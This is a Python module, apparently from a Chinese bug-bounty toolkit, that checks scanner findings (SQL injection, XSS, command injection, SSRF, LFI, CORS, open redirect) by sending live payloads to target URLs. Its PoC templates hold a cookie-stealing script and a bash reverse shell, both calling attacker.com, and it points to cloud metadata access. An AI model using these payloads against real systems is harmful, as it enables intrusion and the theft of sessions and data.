#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vuln_verifier模块，提供相关安全测试功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import json
import os
import time
import uuid
import re
import urllib.request
import urllib.parse
import urllib.error
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field

from utils.logger import log


@dataclass
class VerificationResult:
    """验证结果"""
    verification_id: str
    vuln_id: str
    vuln_name: str
    url: str
    verified: bool = False
    confidence: str = "low"  # high/medium/low
    verification_method: str = ""  # 验证方法
    poc: str = ""  # POC（可复现的请求/命令）
    evidence: List[Dict[str, Any]] = field(default_factory=list)  # 证据列表
    impact_confirmed: bool = False
    impact_description: str = ""
    false_positive: bool = False
    false_positive_reason: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    verified_at: float = field(default_factory=time.time)
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "verification_id": self.verification_id,
            "vuln_id": self.vuln_id,
            "vuln_name": self.vuln_name,
            "url": self.url,
            "verified": self.verified,
            "confidence": self.confidence,
            "verification_method": self.verification_method,
            "poc": self.poc,
            "evidence_count": len(self.evidence),
            "evidence": self.evidence,
            "impact_confirmed": self.impact_confirmed,
            "impact_description": self.impact_description,
            "false_positive": self.false_positive,
            "false_positive_reason": self.false_positive_reason,
            "reproduction_steps": self.reproduction_steps,
            "verified_at": self.verified_at,
            "notes": self.notes
        }


class SRCVulnerabilityVerifier:
    """SRC漏洞验证器"""

    def __init__(self):
        """初始化SRCVulnerabilityVerifier实例。

        Args:
            self: 类实例。
        """
        self.timeout = 15
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    def verify_vulnerability(self, vuln: Dict[str, Any]) -> VerificationResult:
        """
        验证漏洞
        :param vuln: 漏洞信息（来自扫描器）
        """
        result = VerificationResult(
            verification_id=f"ver-{uuid.uuid4().hex[:8]}",
            vuln_id=vuln.get("vuln_id", ""),
            vuln_name=vuln.get("name", ""),
            url=vuln.get("url", "")
        )

        category = vuln.get("category", "")
        log.info(f"验证漏洞: {result.vuln_name} ({category}) - {result.url}")

        try:
            if category == "sqli":
                self._verify_sqli(vuln, result)
            elif category == "xss":
                self._verify_xss(vuln, result)
            elif category == "command_injection":
                self._verify_command_injection(vuln, result)
            elif category == "ssrf":
                self._verify_ssrf(vuln, result)
            elif category == "lfi":
                self._verify_lfi(vuln, result)
            elif category == "open_redirect":
                self._verify_open_redirect(vuln, result)
            elif category == "cors":
                self._verify_cors(vuln, result)
            elif category == "info_disclosure":
                self._verify_info_disclosure(vuln, result)
            else:
                self._verify_generic(vuln, result)

        except Exception as e:
            result.notes = f"验证过程异常: {str(e)}"
            log.error(f"验证异常: {e}")

        # 生成POC
        if result.verified and not result.poc:
            result.poc = self._generate_poc(vuln, result)

        # 生成复现步骤
        if result.verified and not result.reproduction_steps:
            result.reproduction_steps = self._generate_reproduction_steps(vuln, result)

        log.info(f"验证完成: {result.vuln_name}, 已验证={result.verified}, 置信度={result.confidence}")
        return result

    def _verify_sqli(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证SQL注入"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定注入参数"
            return

        # 测试1：单引号报错
        test_payloads = [
            ("'", "单引号"),
            ("1' AND '1'='1", "恒真"),
            ("1' AND '1'='2", "恒假"),
        ]

        responses = []
        for payload, desc in test_payloads:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    body = response.read().decode("utf-8", errors="replace")
                    responses.append({
                        "payload": payload,
                        "description": desc,
                        "status_code": response.status,
                        "content_length": len(body),
                        "body_preview": body[:500]
                    })

                    # 检测SQL错误
                    sql_errors = ["sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlite3.",
                                 "unclosed quotation", "sqlstate", "syntax error"]
                    if any(err in body.lower() for err in sql_errors):
                        result.verified = True
                        result.confidence = "high"
                        result.verification_method = "基于报错的SQL注入确认"
                        result.impact_confirmed = True
                        result.impact_description = "可通过SQL注入读取、修改、删除数据库数据"
                        result.evidence.append({
                            "type": "sql_error",
                            "payload": payload,
                            "evidence": f"检测到SQL错误: {next((e for e in sql_errors if e in body.lower()), '')}"
                        })
                        break
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", errors="replace") if e.fp else ""
                if any(err in body.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "sqlstate"]):
                    result.verified = True
                    result.confidence = "high"
                    result.verification_method = "基于报错的SQL注入确认"
                    result.evidence.append({
                        "type": "sql_error",
                        "payload": payload,
                        "evidence": f"HTTP {e.code} 响应中包含SQL错误"
                    })
                    break
            except Exception:
                pass

        # 测试2：布尔盲注（比较恒真和恒假响应差异）
        if not result.verified and len(responses) >= 2:
            true_resp = next((r for r in responses if "恒真" in r["description"]), None)
            false_resp = next((r for r in responses if "恒假" in r["description"]), None)
            if true_resp and false_resp:
                length_diff = abs(true_resp["content_length"] - false_resp["content_length"])
                if length_diff > 50:  # 响应长度差异明显
                    result.verified = True
                    result.confidence = "medium"
                    result.verification_method = "基于布尔逻辑的SQL注入确认"
                    result.evidence.append({
                        "type": "boolean_based",
                        "evidence": f"恒真响应长度={true_resp['content_length']}, 恒假响应长度={false_resp['content_length']}, 差异={length_diff}"
                    })

        result.evidence.extend(responses)

    def _verify_xss(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证XSS"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        payload = vuln.get("payload", "<script>alert(1)</script>")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定XSS参数"
            return

        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                body = response.read().decode("utf-8", errors="replace")

                # 检查payload是否未过滤输出
                if payload in body:
                    # 检查是否在HTML上下文中（不在script标签的属性值中）
                    context = self._determine_xss_context(body, payload)
                    if context in ["html", "attribute", "script"]:
                        result.verified = True
                        result.confidence = "high"
                        result.verification_method = f"反射型XSS确认（{context}上下文）"
                        result.impact_confirmed = True
                        result.impact_description = "可执行任意JavaScript，窃取用户Cookie和会话"
                        result.evidence.append({
                            "type": "xss_reflected",
                            "payload": payload,
                            "context": context,
                            "evidence": f"payload未过滤直接输出在{context}上下文中"
                        })
                    else:
                        result.verified = True
                        result.confidence = "medium"
                        result.verification_method = "反射型XSS确认（需进一步验证上下文）"
                        result.evidence.append({
                            "type": "xss_reflected",
                            "payload": payload,
                            "evidence": "payload未过滤输出，但上下文需进一步确认"
                        })
                else:
                    result.false_positive = True
                    result.false_positive_reason = "payload被过滤或未在响应中输出"

        except Exception as e:
            result.notes = f"XSS验证异常: {str(e)}"

    def _determine_xss_context(self, body: str, payload: str) -> str:
        """确定XSS上下文"""
        pos = body.find(payload)
        if pos == -1:
            return "unknown"

        # 检查前后内容
        before = body[max(0, pos - 50):pos]
        after = body[pos:pos + len(payload) + 50]

        # 在script标签中
        if "<script" in before.lower() and "</script>" in after.lower():
            return "script"
        # 在HTML属性中
        if before.rstrip().endswith(("='", '="', "=")):
            return "attribute"
        # 在HTML正文
        return "html"

    def _verify_command_injection(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证命令注入"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定注入参数"
            return

        # 使用无害命令验证
        test_commands = [
            ("; echo INJECTION_TEST_12345", "分号注入"),
            ("| echo INJECTION_TEST_12345", "管道注入"),
            ("&& echo INJECTION_TEST_12345", "AND注入"),
        ]

        for payload, desc in test_commands:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    body = response.read().decode("utf-8", errors="replace")
                    if "INJECTION_TEST_12345" in body:
                        result.verified = True
                        result.confidence = "high"
                        result.verification_method = f"命令注入确认（{desc}）"
                        result.impact_confirmed = True
                        result.impact_description = "可执行任意系统命令，完全控制服务器"
                        result.evidence.append({
                            "type": "command_injection",
                            "payload": payload,
                            "evidence": "命令执行结果在响应中返回（INJECTION_TEST_12345）"
                        })
                        break
            except Exception:
                pass

        if not result.verified:
            result.confidence = "low"
            result.notes = "命令注入未通过无害命令验证，可能需要手动确认"

    def _verify_ssrf(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证SSRF"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定SSRF参数"
            return

        # 测试访问内部服务
        test_payloads = [
            ("http://127.0.0.1:80", "本地HTTP"),
            ("http://127.0.0.1:22", "本地SSH"),
            ("file:///etc/passwd", "file协议"),
        ]

        for payload, desc in test_payloads:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    body = response.read().decode("utf-8", errors="replace")

                    if "root:x:" in body or "root:" in body:
                        result.verified = True
                        result.confidence = "high"
                        result.verification_method = "SSRF确认（file协议读取/etc/passwd）"
                        result.impact_confirmed = True
                        result.impact_description = "可读取本地文件，访问内部服务"
                        result.evidence.append({
                            "type": "ssrf_file_read",
                            "payload": payload,
                            "evidence": "成功读取/etc/passwd"
                        })
                        break

                    if response.status == 200 and len(body) > 100 and "html" in body.lower():
                        result.verified = True
                        result.confidence = "medium"
                        result.verification_method = f"SSRF确认（{desc}）"
                        result.evidence.append({
                            "type": "ssrf_internal_access",
                            "payload": payload,
                            "evidence": f"成功访问内部服务，响应长度={len(body)}"
                        })
                        break

            except Exception:
                pass

    def _verify_lfi(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证LFI"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定LFI参数"
            return

        test_payloads = [
            "../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
        ]

        for payload in test_payloads:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
                with urllib.request.urlopen(req, timeout=self.timeout) as response:
                    body = response.read().decode("utf-8", errors="replace")
                    if "root:x:" in body or "root:" in body:
                        result.verified = True
                        result.confidence = "high"
                        result.verification_method = "LFI确认（读取/etc/passwd）"
                        result.impact_confirmed = True
                        result.impact_description = "可读取服务器任意文件，包含敏感配置和源代码"
                        result.evidence.append({
                            "type": "lfi_file_read",
                            "payload": payload,
                            "evidence": "成功读取/etc/passwd"
                        })
                        break
            except Exception:
                pass

    def _verify_open_redirect(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证开放重定向"""
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        base_url = url.split("?")[0]

        if not param:
            result.false_positive = True
            result.false_positive_reason = "未指定重定向参数"
            return

        test_url = f"{base_url}?{param}=https://evil.com"
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                if "evil.com" in response.url.lower():
                    result.verified = True
                    result.confidence = "high"
                    result.verification_method = "开放重定向确认"
                    result.impact_confirmed = True
                    result.impact_description = "可将用户重定向到任意网站，用于钓鱼攻击"
                    result.evidence.append({
                        "type": "open_redirect",
                        "evidence": f"重定向到: {response.url}"
                    })
                else:
                    result.false_positive = True
                    result.false_positive_reason = "未重定向到evil.com"
        except Exception as e:
            result.notes = f"开放重定向验证异常: {str(e)}"

    def _verify_cors(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证CORS配置错误"""
        url = vuln.get("url", "")

        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": self.user_agent,
                "Origin": "https://evil.com"
            })
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                acao = response.headers.get("Access-Control-Allow-Origin", "")
                acac = response.headers.get("Access-Control-Allow-Credentials", "")

                if acao == "*" and acac.lower() == "true":
                    result.verified = True
                    result.confidence = "high"
                    result.verification_method = "CORS配置错误确认（通配符+凭证）"
                    result.impact_confirmed = True
                    result.impact_description = "攻击者可通过恶意网站窃取已登录用户的敏感数据"
                    result.evidence.append({
                        "type": "cors_misconfig",
                        "evidence": f"ACAO: {acao}, ACAC: {acac}"
                    })
                elif acao == "https://evil.com":
                    result.verified = True
                    result.confidence = "high"
                    result.verification_method = "CORS配置错误确认（反射Origin）"
                    result.impact_confirmed = True
                    result.impact_description = "攻击者可构造恶意网站窃取已登录用户的敏感数据"
                    result.evidence.append({
                        "type": "cors_misconfig",
                        "evidence": f"ACAO反射任意Origin: {acao}"
                    })
                else:
                    result.false_positive = True
                    result.false_positive_reason = "CORS配置正常"
        except Exception as e:
            result.notes = f"CORS验证异常: {str(e)}"

    def _verify_info_disclosure(self, vuln: Dict[str, Any], result: VerificationResult):
        """验证敏感信息泄露"""
        url = vuln.get("url", "")

        try:
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=self.timeout) as response:
                body = response.read().decode("utf-8", errors="replace")
                if response.status == 200 and len(body) > 10:
                    result.verified = True
                    result.confidence = "high"
                    result.verification_method = "敏感文件可访问确认"
                    result.impact_confirmed = True
                    result.impact_description = vuln.get("description", "敏感文件可被未授权访问")
                    result.evidence.append({
                        "type": "info_disclosure",
                        "evidence": f"文件可访问，大小={len(body)}字节"
                    })
                else:
                    result.false_positive = True
                    result.false_positive_reason = "文件不可访问或为空"
        except Exception as e:
            result.notes = f"信息泄露验证异常: {str(e)}"

    def _verify_generic(self, vuln: Dict[str, Any], result: VerificationResult):
        """通用验证"""
        result.verified = True
        result.confidence = "low"
        result.verification_method = "通用验证（需手动确认）"
        result.notes = "该漏洞类型暂无自动验证逻辑，建议手动确认"

    def _generate_poc(self, vuln: Dict[str, Any], result: VerificationResult) -> str:
        """生成POC"""
        category = vuln.get("category", "")
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        payload = vuln.get("payload", "")

        if category == "sqli":
            return f"""# SQL注入 POC
## 目标
{url}

## 注入参数
{param}

## Payload
```
{payload}
```

## 验证命令
```bash
curl "{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}"
```

## sqlmap命令
```bash
sqlmap -u "{url}" --batch --dbs
```
"""

        elif category == "xss":
            return f"""# XSS POC
## 目标
{url}

## 注入参数
{param}

## Payload
```html
{payload}
```

## 验证URL
```
{url.split('?')[0]}?{param}={urllib.parse.quote(payload)}
```

## Cookie窃取POC
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```
"""

        elif category == "command_injection":
            return f"""# 命令注入 POC
## 目标
{url}

## 注入参数
{param}

## Payload
```
{payload}
```

## 验证命令
```bash
curl "{url.split('?')[0]}?{param}={urllib.parse.quote('; id')}"
```

## 反向Shell
```bash
; bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```
"""

        else:
            return f"""# {vuln.get('name', '漏洞')} POC
## 目标
{url}

## 描述
{vuln.get('description', '')}

## Payload
```
{payload}
```

## 验证URL
```
{url}
```
"""

    def _generate_reproduction_steps(self, vuln: Dict[str, Any], result: VerificationResult) -> List[str]:
        """生成复现步骤"""
        category = vuln.get("category", "")
        url = vuln.get("url", "")
        param = vuln.get("parameter", "")
        payload = vuln.get("payload", "")

        steps = [
            f"1. 访问目标URL: {url.split('?')[0]}",
        ]

        if param:
            steps.append(f"2. 在参数 {param} 中输入payload: {payload}")
            steps.append(f"3. 完整请求URL: {url.split('?')[0]}?{param}={urllib.parse.quote(payload)}")
        else:
            steps.append(f"2. 发送请求到: {url}")

        if category == "sqli":
            steps.append("4. 观察响应，确认SQL错误或数据被提取")
            steps.append("5. 使用sqlmap进一步验证: sqlmap -u \"" + url + "\" --batch")
        elif category == "xss":
            steps.append("4. 观察页面，确认JavaScript被执行（如弹出alert）")
            steps.append("5. 查看页面源码，确认payload未被过滤直接输出")
        elif category == "command_injection":
            steps.append("4. 观察响应，确认系统命令执行结果")
            steps.append("5. 使用 ; id 或 | whoami 进一步验证")
        elif category == "ssrf":
            steps.append("4. 观察响应，确认内部服务被访问")
            steps.append("5. 尝试访问 http://169.254.169.254 获取云元数据")
        else:
            steps.append("4. 观察响应，确认漏洞存在")

        steps.append("6. 记录截图和请求/响应作为证据")

        return steps

    def batch_verify(self, vulnerabilities: List[Dict[str, Any]]) -> List[VerificationResult]:
        """批量验证漏洞"""
        results = []
        for vuln in vulnerabilities:
            result = self.verify_vulnerability(vuln)
            results.append(result)
        return results

    def get_verification_summary(self, results: List[VerificationResult]) -> Dict[str, Any]:
        """获取验证摘要"""
        verified = sum(1 for r in results if r.verified)
        false_positives = sum(1 for r in results if r.false_positive)
        high_confidence = sum(1 for r in results if r.confidence == "high")
        impact_confirmed = sum(1 for r in results if r.impact_confirmed)

        return {
            "total": len(results),
            "verified": verified,
            "false_positives": false_positives,
            "high_confidence": high_confidence,
            "impact_confirmed": impact_confirmed,
            "verification_rate": round(verified / len(results) * 100, 2) if results else 0,
            "false_positive_rate": round(false_positives / len(results) * 100, 2) if results else 0,
            "verified_vulnerabilities": [r.to_dict() for r in results if r.verified],
            "false_positives_list": [r.to_dict() for r in results if r.false_positive]
        }


# 全局实例
src_verifier = SRCVulnerabilityVerifier()
